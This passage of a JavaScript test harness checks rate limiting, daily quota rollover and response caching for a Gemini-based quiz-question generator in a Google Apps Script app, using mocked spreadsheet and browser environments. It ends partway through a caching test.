/**
 * tests/test_adversarial_m4_challenger_2.js
 *
 * ADVERSARIAL STRESS TEST HARNESS — MILESTONE 4 (TIER 8 VERIFICATION)
 * Empirical challenger harness for Gemini Generation, Token Quota & Formula Sanitization.
 *
 * Verifies:
 * 1. Rate Limiting Burst Stress:
 *    - Exactly 15 rapid consecutive calls succeed; 16th blocked with HTTP 429 semantics and positive retryAfterSeconds <= 60.
 *    - Rolling anti-tumbling sliding window: aging out Call 1 opens up exactly 1 slot.
 * 2. Daily Quota Stress:
 *    - 1,500 daily calls permitted; 1,501st blocked with code 429, DAILY_QUOTA_EXCEEDED, and exact retryAfterSeconds to UTC midnight.
 *    - Automatic rollover across UTC 00:00:00 resets daily count to fresh day.
 * 3. Caching & Zero-Token Burn:
 *    - Repeated calls with identical 10 parameters return cached: true and burn 0 tokens.
 *    - Cache bypass with forceRefresh: true burns fresh tokens and increments rate limits.
 * 4. CWE-1236 Formula Injection Neutralization:
 *    - Leading formula characters (=, +, -, @, \t, \r, and leading whitespace "  =1+1") prepended with ' across title, questionText, options, hint, and explanation.
 *    - Complete dual-mode parity between GAS Backend and BrowserMockBackend.
 */

const assert = require('assert');
const path = require('path');
const fs = require('fs');
const vm = require('vm');
const crypto = require('crypto');

// =========================================================================
// IN-MEMORY GOOGLE APPS SCRIPT SPREADSHEET & ENVIRONMENT SIMULATOR
// =========================================================================

class MockRange {
  constructor(sheet, startRow, startCol, numRows = 1, numCols = 1) {
    this.sheet = sheet;
    this.startRow = startRow;
    this.startCol = startCol;
    this.numRows = numRows;
    this.numCols = numCols;
  }
  getValues() {
    const res = [];
    for (let r = 0; r < this.numRows; r++) {
      const rowIdx = this.startRow - 1 + r;
      if (rowIdx < this.sheet.grid.length) {
        res.push([...this.sheet.grid[rowIdx]]);
      } else {
        res.push(new Array(this.numCols).fill(''));
      }
    }
    return res;
  }
  setValues(vals) {
    for (let r = 0; r < vals.length; r++) {
      const rowIdx = this.startRow - 1 + r;
      while (this.sheet.grid.length <= rowIdx) {
        this.sheet.grid.push([]);
      }
      for (let c = 0; c < vals[r].length; c++) {
        this.sheet.grid[rowIdx][this.startCol - 1 + c] = vals[r][c];
      }
    }
    return this;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setHorizontalAlignment() { return this; }
  setBorder() { return this; }
}

class MockSheet {
  constructor(name) {
    this.name = name;
    this.grid = [];
    this.frozenRows = 0;
  }
  getName() { return this.name; }
  setName(n) { this.name = n; }
  getLastRow() { return this.grid.length; }
  getLastColumn() {
    let max = 0;
    this.grid.forEach(row => { if (row.length > max) max = row.length; });
    return max;
  }
  appendRow(rowArr) {
    this.grid.push([...rowArr]);
  }
  insertRowsBefore(beforeRow, count) {
    for (let i = 0; i < count; i++) this.grid.splice(beforeRow - 1, 0, []);
  }
  deleteRow(rowNumber) {
    this.grid.splice(rowNumber - 1, 1);
  }
  setFrozenRows(n) { this.frozenRows = n; }
  getRange(startRow, startCol, numRows = 1, numCols = 1) {
    return new MockRange(this, startRow, startCol, numRows, numCols);
  }
  getDataRange() {
    const numRows = Math.max(1, this.grid.length);
    let numCols = 1;
    this.grid.forEach(r => { if (r.length > numCols) numCols = r.length; });
    return new MockRange(this, 1, 1, numRows, numCols);
  }
}

class MockSpreadsheet {
  constructor() {
    this.sheets = [];
  }
  getSheetByName(name) {
    return this.sheets.find(s => s.name === name) || null;
  }
  insertSheet(name) {
    const s = new MockSheet(name);
    this.sheets.push(s);
    return s;
  }
}

let mockSpreadsheet = new MockSpreadsheet();
global.SpreadsheetApp = {
  getActiveSpreadsheet: () => mockSpreadsheet,
  BorderStyle: { SOLID: 'SOLID' }
};

global.LockService = {
  getScriptLock: () => ({
    waitLock: () => true,
    releaseLock: () => true,
    tryLock: () => true
  })
};

global.Session = {
  getActiveUser: () => ({ getEmail: () => 'admin@zoptro.local' }),
  getScriptTimeZone: () => 'UTC'
};

global.Utilities = {
  computeDigest: (alg, val) => Array.from(crypto.createHash('sha256').update(val, 'utf8').digest()),
  DigestAlgorithm: { SHA_256: 'SHA_256' }
};

const _mockProperties = {};
global.PropertiesService = {
  getScriptProperties: () => ({
    getProperty: (k) => _mockProperties[k] || null,
    setProperty: (k, v) => { _mockProperties[k] = String(v); },
    deleteProperty: (k) => { delete _mockProperties[k]; },
    deleteAllProperties: () => {
      for (const k of Object.keys(_mockProperties)) delete _mockProperties[k];
    }
  })
};

const _mockCache = {};
global.CacheService = {
  getScriptCache: () => ({
    get: (k) => _mockCache[k] || null,
    put: (k, v, ttl) => { _mockCache[k] = String(v); },
    remove: (k) => { delete _mockCache[k]; }
  })
};

let mockFetchHandler = null;
global.UrlFetchApp = {
  fetch: (url, opts) => {
    if (typeof mockFetchHandler === 'function') {
      return mockFetchHandler(url, opts);
    }
    return {
      getResponseCode: () => 200,
      getContentText: () => JSON.stringify({
        candidates: [{
          content: {
            parts: [{
              text: JSON.stringify([
                {
                  title: 'Sample Question',
                  questionText: 'What is 2 + 2?',
                  options: ['3', '4', '5', '6'],
                  correctOptionIndex: 1,
                  hint: 'Add 2 and 2',
                  explanation: '2 + 2 equals 4.'
                }
              ])
            }]
          },
          finishReason: 'STOP'
        }],
        usageMetadata: {
          promptTokenCount: 200,
          candidatesTokenCount: 150,
          totalTokenCount: 350
        }
      })
    };
  }
};

const gasBackend = require('../google_apps_script_backend.js');

// =========================================================================
// BROWSER MOCK BACKEND SIMULATOR EXTRACTION
// =========================================================================
const HTML_PATH = path.join(__dirname, '..', 'divyank_mission_control_google_apps_script_app.html');
const htmlContent = fs.readFileSync(HTML_PATH, 'utf8');
const scriptMatches = htmlContent.match(/<script[\s\S]*?<\/script>/gi) || [];
const lastScriptTag = scriptMatches[scriptMatches.length - 1];
const scriptCode = lastScriptTag.replace(/<\/?script[^>]*>/gi, '');

function createMockBrowser() {
  const domElements = {};
  const idRegex = new RegExp('\\bid=["\']([^"\']+)["\']', 'g');
  let match;
  while ((match = idRegex.exec(htmlContent)) !== null) {
    const id = match[1];
    domElements[id] = {
      id: id,
      tagName: 'DIV',
      value: '',
      innerText: '',
      innerHTML: '',
      checked: false,
      disabled: false,
      className: '',
      classList: {
        _classes: new Set(),
        add: function(...c) { c.forEach(x => this._classes.add(x)); },
        remove: function(...c) { c.forEach(x => this._classes.delete(x)); },
        contains: function(c) { return this._classes.has(c); }
      },
      style: {},
      children: [],
      appendChild: function(c) { this.children.push(c); return c; },
      focus: function() {},
      closest: function() { return this; },
      getContext: () => ({ clearRect: () => {}, save: () => {}, restore: () => {} })
    };
  }

  const mockStorage = {
    _data: {},
    getItem: function(k) { return this._data.hasOwnProperty(k) ? this._data[k] : null; },
    setItem: function(k, v) { this._data[k] = String(v); },
    removeItem: function(k) { delete this._data[k]; },
    clear: function() { this._data = {}; }
  };

  const mockDoc = {
    getElementById: function(id) { return domElements[id] || null; },
    querySelector: function(sel) {
      if (sel && sel.startsWith('#')) return domElements[sel.slice(1)] || null;
      return null;
    },
    querySelectorAll: () => [],
    createElement: function(tag) {
      return {
        tagName: tag.toUpperCase(),
        innerText: '',
        innerHTML: '',
        className: '',
        classList: {
          _classes: new Set(),
          add: function(...c) { c.forEach(x => this._classes.add(x)); },
          remove: function(...c) { c.forEach(x => this._classes.delete(x)); },
          contains: function(c) { return this._classes.has(c); }
        },
        style: {},
        children: [],
        appendChild: function(c) { this.children.push(c); return c; }
      };
    },
    body: { style: {}, appendChild: () => {} },
    addEventListener: () => {}
  };

  const mockWin = {
    location: { hash: '' },
    localStorage: mockStorage,
    document: mockDoc,
    innerWidth: 1280,
    innerHeight: 800,
    scrollTo: () => {},
    setTimeout: setTimeout,
    clearTimeout: clearTimeout,
    setInterval: setInterval,
    clearInterval: clearInterval,
    Date: Date,
    Math: Math,
    JSON: JSON,
    console: console,
    addEventListener: () => {},
    removeEventListener: () => {},
    AudioContext: () => ({ currentTime: 0, destination: {}, createOscillator: () => ({ connect: () => {}, start: () => {}, stop: () => {} }), createGain: () => ({ connect: () => {}, gain: {} }) }),
    playSound: () => {},
    spawnConfetti: () => {},
    alertCustom: () => {}
  };
  mockWin.window = mockWin;

  const sandbox = vm.createContext(mockWin);
  vm.runInContext(scriptCode, sandbox);
  sandbox.BrowserMockBackend.init(true);
  return sandbox;
}

// =========================================================================
// TEST HARNESS RUNNER
// =========================================================================
let testPassed = 0;
let testFailed = 0;
const failureDetails = [];

function runStress(name, fn) {
  try {
    // Reset global backend state before each test
    mockSpreadsheet = new MockSpreadsheet();
    for (const k of Object.keys(_mockProperties)) delete _mockProperties[k];
    for (const k of Object.keys(_mockCache)) delete _mockCache[k];
    if (gasBackend._inMemoryScriptProperties) gasBackend._inMemoryScriptProperties.deleteAllProperties();
    if (gasBackend._inMemoryScriptCache && gasBackend._inMemoryScriptCache._data) gasBackend._inMemoryScriptCache._data = {};
    gasBackend.initializeDatabase();
    gasBackend.ensureAdminUserInSheet();
    _mockProperties['GEMINI_API_KEY'] = 'adversarial-gemini-key';
    mockFetchHandler = null;

    fn();
    testPassed++;
    console.log(`  ✔ [PASS] ${name}`);
  } catch (err) {
    testFailed++;
    failureDetails.push({ name, error: err });
    console.error(`  ✘ [FAIL] ${name}: ${err.message}`);
  }
}

console.log('=========================================================================');
console.log('  ADVERSARIAL STRESS TEST SUITE — GEMINI GENERATION & QUOTA CONTROLS');
console.log('=========================================================================');

// =========================================================================
// SUITE 1: RATE LIMITING BURST STRESS & ROLLING ANTI-TUMBLING
// =========================================================================
console.log('\n--- SUITE 1: RATE LIMITING BURST STRESS & ROLLING ANTI-TUMBLING ---');

runStress('RL-01: Exactly 15 rapid consecutive calls succeed; 16th is blocked with 429 semantics', () => {
  const model = 'gemini-1.5-flash';
  for (let i = 1; i <= 15; i++) {
    const decision = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(decision.allowed, true, `Call #${i} should be permitted`);
    assert.strictEqual(decision.rpmCurrent, i, `rpmCurrent should equal ${i}`);
    assert.strictEqual(decision.rpmRemaining, 15 - i, `rpmRemaining should equal ${15 - i}`);
  }

  // 16th call MUST be blocked
  const blocked16 = gasBackend.checkAndIncrementRateLimit(model, true);
  assert.strictEqual(blocked16.allowed, false, '16th call must be blocked');
  assert.strictEqual(blocked16.rpmCurrent, 15);
  assert.strictEqual(blocked16.rpmRemaining, 0);
  assert.ok(blocked16.retryAfterSeconds > 0, 'retryAfterSeconds must be positive');
  assert.ok(blocked16.retryAfterSeconds <= 60, 'retryAfterSeconds must be <= 60');
  assert.ok(blocked16.error.includes('RATE_LIMIT_EXCEEDED'), 'Error message must reflect RATE_LIMIT_EXCEEDED');
});

runStress('RL-02: Subsequent burst calls (17th to 25th) remain blocked and maintain stable quota state', () => {
  const model = 'gemini-1.5-flash';
  for (let i = 1; i <= 15; i++) gasBackend.checkAndIncrementRateLimit(model, true);

  for (let i = 16; i <= 25; i++) {
    const decision = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(decision.allowed, false, `Call #${i} must remain blocked`);
    assert.strictEqual(decision.rpmCurrent, 15);
    assert.strictEqual(decision.rpmRemaining, 0);
    assert.ok(decision.retryAfterSeconds > 0 && decision.retryAfterSeconds <= 60);
  }
});

runStress('RL-03: generateCurriculumQuestionsWithGemini enforces 429 semantics and logs RATE_LIMITED with 0 tokens', () => {
  const model = 'gemini-1.5-flash';
  for (let i = 1; i <= 15; i++) gasBackend.checkAndIncrementRateLimit(model, true);

  const res16 = gasBackend.generateCurriculumQuestionsWithGemini({
    adminUserId: 'u_adm_demo',
    model: model,
    topic: 'Burst Stress Topic',
    forceRefresh: true
  });

  assert.strictEqual(res16.success, false, 'Generator call 16 must fail');
  assert.strictEqual(res16.code, 429, 'HTTP code must be 429');
  assert.ok(res16.error.includes('RATE_LIMIT_EXCEEDED'));
  assert.ok(res16.rateLimits.retryAfterSeconds > 0 && res16.rateLimits.retryAfterSeconds <= 60);

  // Check Table 15 GeminiTokenLogs
  const logs = gasBackend.getSheetRecords('GeminiTokenLogs');
  const lastLog = logs[logs.length - 1];
  assert.strictEqual(lastLog.status, 'RATE_LIMITED');
  assert.strictEqual(Number(lastLog.totalTokens), 0, 'Total tokens must be 0 for rate-limited call');
  assert.strictEqual(Number(lastLog.promptTokens), 0);
  assert.strictEqual(Number(lastLog.candidateTokens), 0);
});

runStress('RL-04: Rolling anti-tumbling sliding window: aging out Call 1 opens up exactly 1 slot', () => {
  const model = 'gemini-1.5-flash';
  const origDateNow = Date.now;
  const T0 = 1750000000000;

  try {
    let mockTime = T0;
    Date.now = () => mockTime;

    // Call 1 at T0
    const c1 = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(c1.allowed, true);
    assert.strictEqual(c1.rpmCurrent, 1);

    // Advance 5 seconds
    mockTime = T0 + 5000;

    // Calls 2 through 15 at T0 + 5000ms
    for (let i = 2; i <= 15; i++) {
      const c = gasBackend.checkAndIncrementRateLimit(model, true);
      assert.strictEqual(c.allowed, true);
    }

    // Call 16 at T0 + 5000ms is BLOCKED
    const c16 = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(c16.allowed, false);

    // Advance clock to T0 + 59,999ms: all 15 calls are still within 60s window (Call 1 age = 59,999ms < 60,000ms)
    mockTime = T0 + 59999;
    const cStillBlocked = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(cStillBlocked.allowed, false, 'At 59.999s all 15 calls still active');

    // Advance clock to T0 + 60,001ms: Call 1 (at T0) has aged 60,001ms (>60s) and EXPIRED.
    // Calls 2-15 (at T0 + 5,000ms) have aged 55,001ms and are STILL ACTIVE.
    mockTime = T0 + 60001;

    // Exactly 1 slot opens up!
    const c17Allowed = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(c17Allowed.allowed, true, 'Call 17 must succeed taking the 1 expired slot');
    assert.strictEqual(c17Allowed.rpmCurrent, 15);
    assert.strictEqual(c17Allowed.rpmRemaining, 0);

    // Immediate next call at T0 + 60,001ms must be blocked again
    const c18Blocked = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(c18Blocked.allowed, false, 'Call 18 must be blocked since only 1 slot opened');

    // Advance clock to T0 + 65,001ms: Calls 2-15 have now aged 60,001ms and EXPIRED!
    // Only Call 17 (recorded at T0 + 60,001ms, age 5,000ms) is active!
    mockTime = T0 + 65001;

    // We should now have 14 slots available
    for (let i = 1; i <= 14; i++) {
      const cSubsequent = gasBackend.checkAndIncrementRateLimit(model, true);
      assert.strictEqual(cSubsequent.allowed, true, `Subsequent call #${i} after slide must succeed`);
    }

    // Now all 15 slots full again
    assert.strictEqual(gasBackend.checkAndIncrementRateLimit(model, true).allowed, false);

  } finally {
    Date.now = origDateNow;
  }
});

runStress('RL-05: Dual-Mode BrowserMockBackend 15 RPM burst and 16th block parity', () => {
  const browser = createMockBrowser();
  const mockBackend = browser.BrowserMockBackend;
  const model = 'gemini-1.5-flash';

  for (let i = 1; i <= 15; i++) {
    const decision = mockBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(decision.allowed, true, `Mock call #${i} should be permitted`);
    assert.strictEqual(decision.rpmCurrent, i);
  }

  const blocked = mockBackend.checkAndIncrementRateLimit(model, true);
  assert.strictEqual(blocked.allowed, false, 'Mock 16th call must be blocked');
  assert.ok(blocked.retryAfterSeconds > 0 && blocked.retryAfterSeconds <= 60);
  assert.ok(blocked.error.includes('RATE_LIMIT_EXCEEDED'));
});

runStress('RL-06: Dual-Mode BrowserMockBackend rolling anti-tumbling sliding window parity', () => {
  const browser = createMockBrowser();
  const mockBackend = browser.BrowserMockBackend;
  const model = 'gemini-1.5-flash';
  const origDateNow = Date.now;
  const T0 = 1750000000000;

  try {
    let mockTime = T0;
    Date.now = () => mockTime;

    // Call 1 at T0
    assert.strictEqual(mockBackend.checkAndIncrementRateLimit(model, true).allowed, true);

    // Advance 10s
    mockTime = T0 + 10000;
    for (let i = 2; i <= 15; i++) {
      assert.strictEqual(mockBackend.checkAndIncrementRateLimit(model, true).allowed, true);
    }
    assert.strictEqual(mockBackend.checkAndIncrementRateLimit(model, true).allowed, false);

    // Advance to T0 + 60,001ms
    mockTime = T0 + 60001;

    // 1 slot opens up
    const allowed = mockBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(allowed.allowed, true, 'Mock: exactly 1 slot opens after Call 1 expires');
    assert.strictEqual(allowed.rpmCurrent, 15);

    // Next is blocked
    assert.strictEqual(mockBackend.checkAndIncrementRateLimit(model, true).allowed, false);

  } finally {
    Date.now = origDateNow;
  }
});

// =========================================================================
// SUITE 2: DAILY QUOTA STRESS (1,500 RPD) & ROLLOVER MECHANICS
// =========================================================================
console.log('\n--- SUITE 2: DAILY QUOTA STRESS (1,500 RPD) & ROLLOVER MECHANICS ---');

runStress('DQ-01: Exactly 1,500 calls reach daily quota limit; 1,501st call is rejected with DAILY_QUOTA_EXCEEDED', () => {
  const model = 'gemini-1.5-flash';
  const todayUtc = new Date().toISOString().substring(0, 10);
  const rpdKey = 'gemini_rpd_gemini-1.5-flash_' + todayUtc;

  // Pre-seed 1499 calls
  _mockCache[rpdKey] = '1499';
  _mockProperties[rpdKey] = '1499';

  // 1,500th call must succeed
  const call1500 = gasBackend.checkAndIncrementRateLimit(model, true);
  assert.strictEqual(call1500.allowed, true, '1,500th call must be allowed');
  assert.strictEqual(call1500.rpdCurrent, 1500);
  assert.strictEqual(call1500.dailyRemaining, 0);

  // 1,501st call MUST be rejected
  const call1501 = gasBackend.checkAndIncrementRateLimit(model, true);
  assert.strictEqual(call1501.allowed, false, '1,501st call must be blocked');
  assert.strictEqual(call1501.rpdCurrent, 1500);
  assert.strictEqual(call1501.dailyRemaining, 0);
  assert.ok(call1501.error.includes('DAILY_QUOTA_EXCEEDED'), 'Error must specify DAILY_QUOTA_EXCEEDED');
  assert.ok(call1501.retryAfterSeconds > 0 && call1501.retryAfterSeconds <= 86400);
});

runStress('DQ-02: generateCurriculumQuestionsWithGemini returns code 429 and DAILY_QUOTA_EXCEEDED on 1,501st call', () => {
  const model = 'gemini-1.5-flash';
  const todayUtc = new Date().toISOString().substring(0, 10);
  const rpdKey = 'gemini_rpd_gemini-1.5-flash_' + todayUtc;

  _mockCache[rpdKey] = '1500';
  _mockProperties[rpdKey] = '1500';

  const res = gasBackend.generateCurriculumQuestionsWithGemini({
    adminUserId: 'u_adm_demo',
    model: model,
    topic: 'Daily Quota Exceeded Topic',
    forceRefresh: true
  });

  assert.strictEqual(res.success, false);
  assert.strictEqual(res.code, 429);
  assert.ok(res.error.includes('DAILY_QUOTA_EXCEEDED'));
  assert.strictEqual(res.rateLimits.dailyRemaining, 0);
  assert.ok(res.rateLimits.retryAfterSeconds > 0 && res.rateLimits.retryAfterSeconds <= 86400);
});

runStress('DQ-03: Rollover across UTC 00:00:00 automatically resets daily quota counter to 0', () => {
  const model = 'gemini-1.5-flash';
  const origDateNow = Date.now;

  try {
    // Phase 1: 2026-11-07 23:59:59 UTC
    const tDay1 = new Date('2026-11-07T23:59:59.000Z').getTime();
    Date.now = () => tDay1;

    const rpdKeyDay1 = 'gemini_rpd_gemini-1.5-flash_2026-11-07';
    _mockCache[rpdKeyDay1] = '1500';
    _mockProperties[rpdKeyDay1] = '1500';

    const blockedDay1 = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(blockedDay1.allowed, false, 'Must be blocked at 23:59:59 on Day 1');
    assert.strictEqual(blockedDay1.retryAfterSeconds, 1, 'Retry after seconds should be exactly 1 second to midnight');

    // Phase 2: Advance 2 seconds to 2026-11-08 00:00:01 UTC (Day 2)
    const tDay2 = tDay1 + 2000;
    Date.now = () => tDay2;

    const allowedDay2 = gasBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(allowedDay2.allowed, true, 'Must automatically permit calls on Day 2');
    assert.strictEqual(allowedDay2.rpdCurrent, 1, 'Day 2 counter must start at 1');
    assert.strictEqual(allowedDay2.dailyRemaining, 1499);

  } finally {
    Date.now = origDateNow;
  }
});

runStress('DQ-04: Multi-Phase UTC midnight distance calculation is accurate to the exact second', () => {
  const model = 'gemini-1.5-flash';
  const origDateNow = Date.now;

  const testTimes = [
    { iso: '2026-11-07T00:00:00.000Z', expectedSeconds: 86400 },
    { iso: '2026-11-07T06:00:00.000Z', expectedSeconds: 64800 },
    { iso: '2026-11-07T12:00:00.000Z', expectedSeconds: 43200 },
    { iso: '2026-11-07T18:00:00.000Z', expectedSeconds: 21600 },
    { iso: '2026-11-07T23:59:50.000Z', expectedSeconds: 10 }
  ];

  try {
    for (const item of testTimes) {
      const ms = new Date(item.iso).getTime();
      Date.now = () => ms;
      const dateStr = item.iso.substring(0, 10);
      const rpdKey = 'gemini_rpd_gemini-1.5-flash_' + dateStr;
      _mockCache[rpdKey] = '1500';
      _mockProperties[rpdKey] = '1500';

      const decision = gasBackend.checkAndIncrementRateLimit(model, true);
      assert.strictEqual(decision.allowed, false);
      assert.strictEqual(
        decision.retryAfterSeconds,
        item.expectedSeconds,
        `retryAfterSeconds at ${item.iso} must equal ${item.expectedSeconds}`
      );
    }
  } finally {
    Date.now = origDateNow;
  }
});

runStress('DQ-05: Dual-Mode BrowserMockBackend daily quota saturation and UTC rollover parity', () => {
  const browser = createMockBrowser();
  const mockBackend = browser.BrowserMockBackend;
  const model = 'gemini-1.5-flash';
  const origDateNow = Date.now;

  try {
    const tDay1 = new Date('2026-11-07T23:59:58.000Z').getTime();
    Date.now = () => tDay1;

    const rpdKey = 'gemini_rpd_gemini-1.5-flash_2026-11-07';
    browser.localStorage.setItem(rpdKey, '1500');

    const blocked = mockBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(blocked.allowed, false, 'Mock must block at 1500');
    assert.ok(blocked.error.includes('DAILY_QUOTA_EXCEEDED'));
    assert.strictEqual(blocked.retryAfterSeconds, 2);

    // Rollover across midnight
    Date.now = () => tDay1 + 4000; // 00:00:02 UTC next day
    const allowed = mockBackend.checkAndIncrementRateLimit(model, true);
    assert.strictEqual(allowed.allowed, true, 'Mock must allow call on new day');
    assert.strictEqual(allowed.rpdCurrent, 1);
    assert.strictEqual(allowed.dailyRemaining, 1499);

  } finally {
    Date.now = origDateNow;
  }
});

// =========================================================================
// SUITE 3: CACHING & ZERO-TOKEN BURN MECHANICS
// =========================================================================
console.log('\n--- SUITE 3: CACHING & ZERO-TOKEN BURN MECHANICS ---');

runStress('CA-01: Canonical 10-parameter SHA-256 fingerprint is deterministic and collision-resistant', () => {
  const base = {
    gradeClass: 'Class 6',
    subject: 'Science',
    chapter: 'Light, Shadows and Reflections',
    topic: 'Pinhole Camera',
    questionType: 'MCQ',
    quantity: 5,
    difficulty: 'Medium',
    bloomLevel: 'Understanding',
    examCategory: 'CBSE',
    model: 'gemini-1.5-flash'
  };

  const baseHash = gasBackend.computeGeminiCacheFingerprint(base);
  assert.strictEqual(typeof baseHash, 'string');
  assert.strictEqual(baseHash.length, 64, 'SHA-256 hash must be 64 hexadecimal characters');

  // Mutate each of the 9 payload parameters individually; each mutation MUST change the hash
  const mutations = [
    { gradeClass: 'Class 7' },
    { subject: 'Mathematics' },
    { chapter: 'Electricity and Circuits' },
    { topic: 'Electric Cell' },
    { questionType: 'SHORT_ANSWER' },
    { quantity: 10 },
    { difficulty: 'Hard' },
    { bloomLevel: 'Analyzing' },
    { model: 'gemini-2.0-flash' }
  ];

  for (const mut of mutations) {
    const mutatedObj = Object.assign({}, base, mut);
    const mutatedHash = gasBackend.computeGeminiCacheFingerprint(mutatedObj);
    assert.notStrictEqual(
      mutatedHash,
      baseHash,
      `Mutating ${Object.keys(mut)[0]} must alter the SHA-256 fingerprint`
    );
  }
});

runStress('CA-02: Fingerprint delimiter boundary security prevents parameter shifting collisions', () => {
  // If delimiters were weak or absent, { topic: "AB", chapter: "C" } could collide with { topic: "A", chapter: "BC" }
  const obj1 = {
    gradeClass: 'Class 5',
    subject: 'Science',
    chapter: 'PartA',
    topic: 'PartB_and_C',
    questionType: 'MCQ'
  };
  const obj2 = {
    gradeClass: 'Class 5',
    subject: 'Science',
    chapter: 'PartA_PartB',
    topic: 'and_C',
    questionType: 'MCQ'
  };

  const hash1 = gasBackend.computeGeminiCacheFingerprint(obj1);
  const hash2 = gasBackend.computeGeminiCacheFingerprint(obj2);
  assert.notStrictEqual(hash1, hash2, 'Parameter boundary shifting must NOT collide');
});

runStress('CA-03: Repeated call with identical 10 parameters returns cached: true and burns 0 tokens', () => {
  let networkCalls = 0;
  mockFetchHandler = () => {
    networkCalls++;
    return {
      getResponseCode: () => 200,
      getContentText: () => JSON.stringify({
        candidates: [{
          content: { parts: [{ text: JSON.stringify([{ title: 'Q', questionText: 'What is 10/2?', options: ['2','3','4','5'], correctOptionIndex: 3 }]) }] },
          finishReason: 'STOP'
        }],
        usageMetadata: { promptTokenCount: 300, candidatesTokenCount: 200, totalTokenCount: 500 }
      })
    };
  };

  const params = {
    adminUserId: 'u_adm_demo',
    gradeClass: 'Class 5',
    subject: 'Mathematics',
    chapter: 'Division',
    topic: 'Simple Division',
    questionType: 'MCQ',
    quantity: 1,
    difficulty: 'Easy',
    bloomLevel: 'Applying',
    examCategory: 'CBSE',
    model: 'gemini-1.5-flash'
  };

  // Call 1: Miss
  const res1 = gasBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res1.success, true);
  assert.strictEqual(res1.cached, false);
  assert.strictEqual(networkCalls, 1);
  assert.strictEqual(res1.tokenUsage.totalTokens, 500);

  // Call 2: Hit
  const res2 = gasBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res2.success, true);
  assert.strictEqual(res2.cached, true, 'Second call must return cached: true');
  assert.strictEqual(networkCalls, 1, 'Network call count must remain 1 (zero network calls on hit)');
  assert.strictEqual(res2.tokenUsage.promptTokens, 0, 'Prompt tokens must be 0');
  assert.strictEqual(res2.tokenUsage.candidateTokens, 0, 'Candidate tokens must be 0');
  assert.strictEqual(res2.tokenUsage.totalTokens, 0, 'Total tokens must be 0');
  assert.strictEqual(res2.tokenUsage.estimatedCostUsd, 0.0000);

  // Deep comparison of items
  assert.strictEqual(res2.items.length, res1.items.length);
  assert.strictEqual(res2.items[0].title, res1.items[0].title);
  assert.strictEqual(res2.items[0].questionText, res1.items[0].questionText);
});

runStress('CA-04: Cache hit does NOT consume rate limits (RPM or Daily RPD)', () => {
  const model = 'gemini-1.5-flash';
  const params = {
    adminUserId: 'u_adm_demo',
    gradeClass: 'Class 4',
    subject: 'Science',
    topic: 'Cache No Quota Burn',
    questionType: 'MCQ',
    quantity: 1,
    model: model
  };

  // Warm cache with Call 1 (consumes 1 RPM and 1 RPD)
  const res1 = gasBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res1.cached, false);
  assert.strictEqual(res1.rateLimits.rpmRemaining, 14);
  assert.strictEqual(res1.rateLimits.dailyRemaining, 1499);

  // Perform 10 consecutive cache hits
  for (let i = 1; i <= 10; i++) {
    const resHit = gasBackend.generateCurriculumQuestionsWithGemini(params);
    assert.strictEqual(resHit.cached, true);
    // Quota remaining must NOT decrement
    assert.strictEqual(resHit.rateLimits.rpmRemaining, 14, `Hit #${i} must not decrement rpmRemaining`);
    assert.strictEqual(resHit.rateLimits.dailyRemaining, 1499, `Hit #${i} must not decrement dailyRemaining`);
  }

  // Check persistent logs
  const logs = gasBackend.getSheetRecords('GeminiTokenLogs');
  assert.strictEqual(logs.length, 11, 'Total 11 logs (1 miss + 10 hits)');
  const hitLogs = logs.filter(l => String(l.cachedFlag) === 'true');
  assert.strictEqual(hitLogs.length, 10);
  hitLogs.forEach(l => {
    assert.strictEqual(Number(l.totalTokens), 0);
    assert.strictEqual(l.status, 'SUCCESS');
  });
});

runStress('CA-05: Cache bypass with forceRefresh: true burns fresh tokens and increments rate limits', () => {
  let fetchCount = 0;
  mockFetchHandler = () => {
    fetchCount++;
    return {
      getResponseCode: () => 200,
      getContentText: () => JSON.stringify({
        candidates: [{
          content: { parts: [{ text: JSON.stringify([{ title: 'Fresh Q ' + fetchCount, questionText: 'Q', options: ['A','B','C','D'], correctOptionIndex: 0 }]) }] },
          finishReason: 'STOP'
        }],
        usageMetadata: { promptTokenCount: 150, candidatesTokenCount: 100, totalTokenCount: 250 }
      })
    };
  };

  const params = {
    adminUserId: 'u_adm_demo',
    gradeClass: 'Class 8',
    subject: 'Mathematics',
    topic: 'Linear Equations',
    questionType: 'MCQ',
    quantity: 1
  };

  // Call 1: miss
  const res1 = gasBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res1.cached, false);
  assert.strictEqual(fetchCount, 1);
  assert.strictEqual(res1.rateLimits.rpmRemaining, 14);

  // Call 2: cached (bypass = false)
  const res2 = gasBackend.generateCurriculumQuestionsWithGemini(params);
  assert.strictEqual(res2.cached, true);
  assert.strictEqual(fetchCount, 1);
  assert.strictEqual(res2.rateLimits.rpmRemaining, 14);

  // Call 3: bypass with forceRefresh: true
  const res3 = gasBackend.generateCurriculumQuestionsWithGemini(Object.assign({}, params, { forceRefresh: true }));
  assert.strictEqual(res3.cached, false, 'forceRefresh: true must bypass cache');
  assert.strictEqual(fetchCount, 2, 'Network must be invoked when forceRefresh is true');
  assert.strictEqual(res3.tokenUsage.totalTokens, 250, 'Fresh tokens must be metered');
  assert.strictEqual(res3.rateLimits.rpmRemaining, 13, 'Rate limit must be consumed on forceRefresh');
});

runStress('CA-06: Dual-Mode BrowserMockBackend caching and zero-token parity', () => {
  const browser = createMockBrowser();
  const mockBackend = browser.BrowserMockBackend;

  const params = {
    adminUserId: 'u_adm_demo',
    gradeClass: 'Class 7',
    subject: 'Science',
    topic: 'Acids Bases and Salts',
    questionType: 'MCQ',
    quantity: 2
  };

